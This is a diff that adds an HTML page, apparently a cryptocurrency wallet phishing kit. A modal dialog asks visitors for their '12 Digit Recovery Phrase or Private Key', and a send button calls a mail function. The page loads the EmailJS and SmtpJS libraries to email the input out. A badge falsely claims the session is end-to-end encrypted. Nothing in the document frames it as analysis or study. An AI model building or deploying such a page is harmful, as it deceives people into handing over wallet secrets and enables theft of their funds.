@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="style2.css">
+    <script type="text/javascript" src="index.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+    </script>
+    <script type="text/javascript">
+        (function () {
+            emailjs.init({
+                publicKey: "5t6q5OmqiQ2Rd0VEX"
+            });
+        })();
+    </script>
+<body>
+    <div class="modal fade popup show" id="popup_connect_wallet" tabindex="-1" style="display: block; padding-right: 15px;" aria-modal="true" role="dialog">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content">
+                <div class="caprpe" style="padding: 20px;"> <br><br><br>
+                    <form>
+                        <textarea name="message" id="message" placeholder="Enter Your 12 Digit Recovery Phrase or Private Key" style="height: 180px;"></textarea>
+                        <BR></BR>
+                        
+                        <button class="btn-outline-primary" type="button" onclick="SendMail()">send</button>
+                    </form>
+                    <h5 align="center" class="mt-4 text-muted align-items-center"><img src="shield.png" width="30" height="30"> This session is protected
+                        with an end-to-end encryption</h5></div>
+            </div>
+        </div>
+    </div>
+    <style>
+        .btn-outline-primary {
+            padding: 20px;
+            width: 100%;
+            border-radius: 20px;
+            font-weight: 700;
+            font-size: 15px;
+            line-height: 22px;
+            padding: 10px 20px;
+            -webkit-transition: all 0.3s ease-in-out;
+            -moz-transition: all 0.3s ease-in-out;
+            -ms-transition: all 0.3s ease-in-out;
+            -o-transition: all 0.3s ease-in-out;
+            transition: all 0.3s ease-in-out;
+            outline: none;
+            border: 1px solid #5142FC;
+            margin-bottom: 10px
+        }
+    </style>
+
+
+
+
+<div class="modal-backdrop fade show"></div></body></html>
+<script src="https://smtpjs.com/v3/smtp.js">
+</script>
+
+</body>
+
+</html>
